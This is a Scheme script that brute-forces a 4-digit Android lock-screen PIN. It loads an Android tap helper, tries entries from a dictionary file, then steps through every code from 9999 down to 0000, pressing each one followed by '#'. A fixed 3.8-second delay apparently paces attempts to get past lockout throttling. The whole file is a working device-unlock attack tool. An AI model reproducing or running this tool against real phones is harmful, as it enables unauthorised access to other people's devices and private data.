(use srfi-13)

(define cruise-control #t)
(define dict-file-name "dict.txt")
(define pin-len 4)
(define range-start 9999)
(define range-end 0000)
(define seconds-between-attempts 3.8)
(define argc 0)
(define current-arg "")
(load "parse-cli.scm")
(load "android-tap.scm")



(define dict '())
(define read-dict-file-ptr (if (file-exists? dict-file-name)
			       (open-input-file  dict-file-name)
			       #f))

(define (press-combo i)
  (if (not cruise-control)
      (let ((x (read-line)))
	(when (not (string? i))
	  (cond ((equal? x "-")
	       (set! i (+ i 2)))
	      ((equal? x "r")
	       (set! i (add1 i)))
	      ((equal? x "s")
	       (set! i (sub1 i))))))
      (z duration: seconds-between-attempts))
  (let ((i (string-pad (if (string? i) i
			   (number->string i))
		       pin-len #\0)))
    (printf "attempt: ~s~%" i)
    (process-digit-str (string-append i "#"))))

(when read-dict-file-ptr
  (define (read-dict-file)
    (let ((line (read-line read-dict-file-ptr)))
      (when (not (eq? line #!eof))
	(when (> (string-length line) 0)
	  (printf "Trying Dict Entry ")
	  (press-combo line)
	  (set! dict (append dict `(,(string->number line)))))
	(read-dict-file))))
  (read-dict-file)
  (print "Dict attempts complete!"))
  
(define (dict-entry-exists? d num)
  (if (not (null? d))
      (let* ((x (car d))
	     (num (if (string? num) (string->number num) num)))
	(if (= x num)
	    #t
	    (dict-entry-exists? (cdr d) num)))
      #f))

(define comp (if (> range-end range-start)
		 >
		 <))
(define op (if (> range-end range-start)
	       add1
	       sub1))
(do ((i range-start (op i)))
    ((comp i range-end))
  (if (and read-dict-file-ptr (dict-entry-exists? dict i))
      (printf "Skipping sequential, already processed in dict: ~A~%" i)
      (begin (printf "Trying Sequential ")
	     (press-combo i))))
(print "brute attempts complete!")
(when read-dict-file-ptr
  (file-close read-dict-file-ptr))
(exit)
